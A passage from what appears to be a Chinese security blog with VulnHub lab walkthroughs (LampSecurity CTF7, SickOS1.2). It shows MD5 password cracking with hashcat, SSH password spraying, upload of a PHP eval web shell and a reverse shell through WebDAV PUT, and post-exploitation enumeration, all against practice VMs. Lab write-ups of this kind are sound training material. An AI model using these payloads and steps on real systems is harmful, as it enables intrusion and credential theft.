fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\n直接是sudo用户组的，直接提权成功。\n密码复用当然，我们也可以登录mysql数据库查看用户与密码。\n#mysql -uroot#show databases;#use users;#select * from users;mysql&gt; select username,password from users;select username,password from users;+-------------------------------+----------------------------------+| username                      | password                         |+-------------------------------+----------------------------------+| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 || john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 || alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 || ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 || leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a || julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 || michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 || bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e || neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 || charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf || foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a || 1@1.com                       | c4ca4238a0b923820dcc509a6f75849b || test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |+-------------------------------+----------------------------------+13 rows in set (0.00 sec)\n\n将这些凭证用sed与awk处理后，将hash值直接丢到hashcat中破解。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ hashcat -a 0 -m 0 passhash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 12 digests; 12 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 2 MBDictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 4 secsed2539fe892d2c52c42a440354e8e3d5:madrid                   4cb9c8a8048fd02294477fcb1a41191a:changeme                 5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234                 098f6bcd4621d373cade4e832627b4f6:test                     b2a97bcecbd9336b98d59d9324dae5cf:chuck33                  2146bf95e8929874fc63d54f50f1d2e3:turtles77                9c42a1346e333a770904b2a2b37fa7d3:somepassword             e22f07b17f98e0d9d364584ced0e3c18:my2cents                 Cracking performance lower than expected?                 * Append -O to the commandline.  This lowers the maximum supported password/salt length (usually down to 32).* Append -w 3 to the commandline.  This can cause your screen to lag.* Append -S to the commandline.  This has a drastic speed impact but can be better for specific attacks.  Typical scenarios are a small wordlist but a large ruleset.* Update your backend API runtime / driver the right way:  https://hashcat.net/faq/wrongdriver* Create more work items to make use of your parallelization power:  https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted.                                                                     Session..........: hashcatStatus...........: ExhaustedHash.Mode........: 0 (MD5)Hash.Target......: passhashTime.Started.....: Wed May  3 14:34:10 2023 (6 secs)Time.Estimated...: Wed May  3 14:34:16 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  2728.7 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 8/12 (66.67%) Digests (total), 8/12 (66.67%) Digests (new)Progress.........: 14344385/14344385 (100.00%)Rejected.........: 0/14344385 (0.00%)Restore.Point....: 14344385/14344385 (100.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Util: 28%Started: Wed May  3 14:33:41 2023Stopped: Wed May  3 14:34:17 2023\n\n我们用这些凭证进行密码喷洒攻击。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo crackmapexec ssh 192.168.56.141 -u username -p pass --continue-on-success | grep +SSH         192.168.56.141  22     192.168.56.141   [+] brian:my2cents SSH         192.168.56.141  22     192.168.56.141   [+] alice:turtles77 SSH         192.168.56.141  22     192.168.56.141   [+] leon:qwer1234 SSH         192.168.56.141  22     192.168.56.141   [+] julia:madrid SSH         192.168.56.141  22     192.168.56.141   [+] michael:somepassword SSH         192.168.56.141  22     192.168.56.141   [+] charles:chuck33\n\n非常OK。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[vulnhub]  SickOS1.2","url":"/2023/05/24/SickOS1.2/","content":"\n\n\n信息收集nmapHost detection\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sn 192.168.56.0/24[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:28 EDTNmap scan report for 192.168.56.1Host is up (0.00026s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.00014s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.136Host is up (0.00012s latency).MAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00083s latency).MAC Address: 00:50:56:E2:96:B0 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.09 seconds\n\nPort scan\n┌──(kali㉿kali)-[~]└─$ sudo nmap -p- --min-rate=10000 192.168.56.136        Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:31 EDTNmap scan report for 192.168.56.136Host is up (0.0012s latency).Not shown: 65533 filtered tcp ports (no-response)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds\n\n只开了22,80两个端口，攻击面有点小。\nTCP Service OS\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -O -p22,80 192.168.56.136 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:32 EDTNmap scan report for 192.168.56.136Host is up (0.00093s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)80/tcp open  http    lighttpd 1.4.28MAC Address: 00:0C:29:F7:DE:A9 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds\n\n80端口运行的lighttpd服务版本是1.4.28，其他没啥信息了。\nUDP\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sU 192.168.56.136Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:35 EDTNmap scan report for 192.168.56.136Host is up (0.00056s latency).All 1000 scanned ports on 192.168.56.136 are in ignored states.Not shown: 1000 open|filtered udp ports (no-response)MAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 21.73 seconds\n\n过。\nVuln scan\n┌──(kali㉿kali)-[~]└─$ sudo nmap --script=vuln 192.168.56.136 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:36 EDTNmap scan report for 192.168.56.136Host is up (0.0017s latency). Not shown: 998 filtered tcp ports (no-response)  PORT   STATE SERVICE     22/tcp open  ssh  80/tcp open  http |_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities. |_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-slowloris-check:                |   VULNERABLE:              |   Slowloris DOS attack                |     State: LIKELY VULNERABLE |     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_      http://ha.ckers.org/slowloris/| http-enum: |_  /test/: Test page|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.MAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 87.09 seconds\n\n只有一个可能存在的DOS漏洞，没啥帮助。\nvuln search\n┌──(kali㉿kali)-[~]└─$ searchsploit lighttpd 1.4   -------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                |  Path-------------------------------------------------------------------------------------------------------------- ---------------------------------lighttpd - Denial of Service (PoC)                                                                            | linux/dos/18295.txtLighttpd 1.4.15 - Multiple Code Execution / Denial of Service / Information Disclosure Vulnerabilities        | windows/remote/30322.rbLighttpd 1.4.16 - FastCGI Header Overflow Remote Command Execution                                            | multiple/remote/4391.cLighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Execution                                            | linux/remote/4437.clighttpd 1.4.31 - Denial of Service (PoC)                                                                     | linux/dos/22902.shLighttpd 1.4.x - mod_userdir Information Disclosure                                                           | linux/remote/31396.txtlighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Service                                             | linux/dos/33591.shLighttpd &lt; 1.4.23 (BSD/Solaris) - Source Code Disclosure                                                      | multiple/remote/8786.txt-------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n在exp-db也没找到 lighttpd 1.4.28可以用的漏洞\nniktonmap没扫出什么信息，试试nikto。\n┌──(kali㉿kali)-[~]└─$ sudo nikto -h 192.168.56.136                                     - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.136+ Target Hostname:    192.168.56.136+ Target Port:        80+ Start Time:         2023-04-19 11:40:45 (GMT-4)---------------------------------------------------------------------------+ Server: lighttpd/1.4.28+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /test/: Directory indexing found.+ /test/: This might be interesting.+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host+ End Time:           2023-04-19 11:41:11 (GMT-4) (26 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n只发现了一个/test目录。其他没啥信息。\nWeb fingerprint┌──(kali㉿kali)-[~]└─$ whatweb 192.168.56.136http://192.168.56.136 [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.28], IP[192.168.56.136], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP/5.3.10-1ubuntu3.21], lighttpd[1.4.28]\n\n网页后端是php写的。\nweb先开网页看一眼吧\n\n确实。但是没信息了。\n看看/test吧。\n\n发现目录是空的，啥也没有。\n得。先目录扫描一下看看有没有其他目录吧。\n┌──(kali㉿kali)-[~]└─$ sudo gobuster dir -u http://192.168.56.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                   ===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://192.168.56.136[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.5[+] Timeout:                 10s===============================================================2023/04/20 08:19:00 Starting gobuster in directory enumeration mode===============================================================/test                 (Status: 301) [Size: 0] [--&gt; http://192.168.56.136/test/]/%7Echeckout%7E       (Status: 403) [Size: 345]Progress: 220251 / 220561 (99.86%)===============================================================2023/04/20 08:19:59 Finished===============================================================\n\n无敌了，啥也没有。只有个/test以及根目录/。（checkou也没东西，别看了）\n想办法从这两个目录下手吧。\nbing搜了一下还有什么别的信息收集方法，发现个基于OWSAP的web安全测试手册里面提到了验证网页支持的所有HTTP方法。除了常见的POST和GET方法，如果我们能使用PUT，将能实现任意文件上传。我们可以在请求中使用OPTIONS方法查看页面支持的HTTP方法。\ncurl的实现：curl -X OPTIONS &lt;ip&gt;, -X指定HTTP方法。\n┌──(kali㉿kali)-[~]└─$ sudo curl -v -X OPTIONS 192.168.56.136*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; OPTIONS / HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 200 OK&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21&lt; Content-type: text/html&lt; Transfer-Encoding: chunked&lt; Date: Wed, 19 Apr 2023 16:43:58 GMT&lt; Server: lighttpd/1.4.28&lt; &lt;html&gt;&lt;img src=&quot;blow.jpg&quot;&gt;&lt;/html&gt;&lt;!-- NOTHING IN HERE ///\\\\\\ --&gt;&gt;&gt;&gt;* Connection #0 to host 192.168.56.136 left intact\n\n可以看到根目录下不支持什么别的方法。\n看看/test的:\n┌──(kali㉿kali)-[~]└─$ sudo curl -v -X OPTIONS 192.168.56.136/test*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; OPTIONS /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 301 Moved Permanently&lt; DAV: 1,2&lt; MS-Author-Via: DAV&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK&lt; Location: http://192.168.56.136/test/&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 16:50:42 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n我们发现&#x2F;test目录下支持PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK等多种方法。其中也有我们最想要的PUT。\n漏洞利用传一下\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -v --upload-file test.html  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 38&gt; Expect: 100-continue&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 417 Expectation Failed&lt; Content-Type: text/html&lt; Content-Length: 363&lt; Connection: close&lt; Date: Wed, 19 Apr 2023 17:14:59 GMT&lt; Server: lighttpd/1.4.28&lt; &#123; [363 bytes data]&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt; &lt;head&gt;  &lt;title&gt;417 - Expectation Failed&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 90   401  100   363    0     0   154k      0 --:--:-- --:--:-- --:--:--  177k* Closing connection 0\n\n报417，啥情况，查一下，发现是服务器端Expectation的问题。默认的是Expect: 100-continue。\n所以我们在Header里面将Expect设置为空即可。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -T test.html -H &quot;Expect:&quot; -v[sudo] password for kali:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 38&gt; &#125; [38 bytes data]* We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 403 Forbidden&lt; Content-Type: text/html&lt; Content-Length: 345&lt; Date: Wed, 19 Apr 2023 17:42:29 GMT&lt; Server: lighttpd/1.4.28&lt; &#123; [345 bytes data]&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt; &lt;head&gt;  &lt;title&gt;403 - Forbidden&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;h1&gt;403 - Forbidden&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;100   383  100   345  100    38   126k  14323 --:--:-- --:--:-- --:--:--  187k* Connection #0 to host 192.168.56.136 left intact\n\n报403没想到的，哪里出问题了，奇了怪了。\n测试一下PUT方法\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -X PUT -v                   *   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 17:43:48 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n奇了怪了，200，完全没问题啊。\n难道因为Header里的Agent是curl给ban了？\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -T test.html -H &quot;Expect:&quot; -v -A &quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&gt; Accept: */*&gt; Content-Length: 38&gt; &#125; [38 bytes data]* We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 403 Forbidden&lt; Content-Type: text/html&lt; Content-Length: 345&lt; Date: Wed, 19 Apr 2023 17:46:44 GMT&lt; Server: lighttpd/1.4.28&lt; &#123; [345 bytes data]&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt; &lt;head&gt;  &lt;title&gt;403 - Forbidden&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;h1&gt;403 - Forbidden&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;100   383  100   345  100    38   136k  15403 --:--:-- --:--:-- --:--:--  187k* Connection #0 to host 192.168.56.136 left intact\n\n很显然并不是。\n算了。用-X PUT --data传试试行不行。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test/test.html -v -X PUT --data &quot;&lt;script&gt;alert(&#x27;put is ok&#x27;) &lt;/script&gt;&quot; *   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test/test.html HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 36&gt; Content-Type: application/x-www-form-urlencoded&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 18:03:45 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n\n还真行。那我们把一句话木马传上去用蚁剑连接试试。\n&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;\n传上去一连，轻松连接，非常ok。\n蚁剑的shell用起来怪怪的。\n而且有点不死心，为啥之前的方法传不上去，我们用刚才那种URL写法把php-reverse-shell传上去。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test/shell.php -T shell.php -H &quot;Expect:&quot; -v                                                           % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test/shell.php HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 5496&gt; &#125; [5496 bytes data]* We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 18:09:51 GMT&lt; Server: lighttpd/1.4.28&lt; 100  5496    0     0  100  5496      0  1888k --:--:-- --:--:-- --:--:-- 2683k* Connection #0 to host 192.168.56.136 left intact\n\n可以发现竟然成功传上去了。\n我们传的php-reverse-shell用的4444端口，始终收不到反弹shell。\n\n换个443试试.\n这次上传定位到上传失败问题：192.168.56.136/test/才能传上去，192.168.56.136/test会失败。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test/ -T door.php -H &quot;Expect:&quot; -v *   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test/door.php HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 31&gt; * We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 18:23:03 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n\n轻松连接。\n┌──(kali㉿kali)-[~]└─$ sudo nc -lvp 443 listening on [any] 443 ...192.168.56.136: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.136] 51687Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux 11:40:47 up  3:13,  0 users,  load average: 0.00, 0.02, 0.05USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$\n\n提升权限\nsudo -l need password 需要密码。寄。 \n看看带SUID的程序 www-data@ubuntu:/$ find / -type f -perm -04000 -ls 2&gt;/dev/nullfind / -type f -perm -04000 -ls 2&gt;/dev/null667707  268 -rwsr-xr--   1 root     dip        273272 Feb  4  2011 /usr/sbin/pppd667843   20 -rwsr-sr-x   1 libuuid  libuuid     17976 Mar 29  2012 /usr/sbin/uuidd786948    8 -rwsr-xr-x   1 root     root         5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device1055122  244 -rwsr-xr-x   1 root     root       248056 Jan 13  2016 /usr/lib/openssh/ssh-keysign668412   12 -rwsr-xr-x   1 root     root         9728 Feb 16  2016 /usr/lib/pt_chown668120   12 -r-sr-xr-x   1 root     root         9532 Mar 30  2016 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper668337   16 -r-sr-xr-x   1 root     root        14320 Mar 30  2016 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper1182917  312 -rwsr-xr--   1 root     messagebus   316824 Jun 13  2013 /usr/lib/dbus-1.0/dbus-daemon-launch-helper660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudoedit667308   16 -rwsr-xr-x   1 root     root        14012 Nov  8  2011 /usr/bin/traceroute6.iputils660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudo659044   32 -rwsr-xr-x   1 root     root        31748 Sep 12  2012 /usr/bin/chsh659043   44 -rwsr-xr-x   1 root     root        41284 Sep 12  2012 /usr/bin/passwd659041   40 -rwsr-xr-x   1 root     root        40292 Sep 12  2012 /usr/bin/chfn667072   44 -rwsr-sr-x   1 daemon   daemon      42800 Oct 25  2011 /usr/bin/at667649   56 -rwsr-xr-x   1 root     root        56208 Jul 28  2011 /usr/bin/mtr659047   60 -rwsr-xr-x   1 root     root        57956 Sep 12  2012 /usr/bin/gpasswd658916   32 -rwsr-xr-x   1 root     root        30896 Sep 12  2012 /usr/bin/newgrp1179695   88 -rwsr-xr-x   1 root     root        88760 Mar 29  2012 /bin/mount1179715   40 -rwsr-xr-x   1 root     root        39116 Nov  8  2011 /bin/ping6                          1182983   28 -rwsr-xr-x   1 root     root        26252 Mar  2  2012 /bin/fusermount1179696   68 -rwsr-xr-x   1 root     root        67720 Mar 29  2012 /bin/umount1179714   36 -rwsr-xr-x   1 root     root        34740 Nov  8  2011 /bin/ping1179689   32 -rwsr-xr-x   1 root     root        31116 Sep 12  2012 /bin/su\n\nat没权限，mtr读文件还是成功不了。无果。 \n\n看看crontab。常规crontab表，一眼没啥可用的东西。 \n传linpeas吧。运行一下，记录一下看起来有点说法的东西 ══╣ Some home ssh config file was found/usr/share/doc/openssh-client/examples/sshd_config                                                      AuthorizedKeysFile      .ssh/authorized_keysSubsystem       sftp    /usr/libexec/sftp-server╔══════════╣ Analyzing Interesting logs Files (limit 70)            -rw-r--r-- 1 www-data www-data 6927 Apr 19 20:02 /var/log/lighttpd/error.log╔══════════╣ Analyzing Other Interesting Files (limit 70)-rw-r--r-- 1 root root 3486 Mar 28  2013 /etc/skel/.bashrc                                              -rw-r--r-- 1 john john 3486 Mar 30  2016 /home/john/.bashrc-rw-r--r-- 1 root root 675 Mar 28  2013 /etc/skel/.profile-rw-r--r-- 1 john john 675 Mar 30  2016 /home/john/.profile╔══════════╣ Cron jobs╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                  /usr/bin/crontab                                                                                        incrontab Not Found-rw-r--r-- 1 root root     722 Jun 19  2012 /etc/crontab                                                /etc/cron.daily:total 72drwxr-xr-x  2 root root  4096 Apr 12  2016 .drwxr-xr-x 84 root root  4096 Apr 19 20:39 ..-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db-rwxr-xr-x  1 root root   606 Aug 17  2011 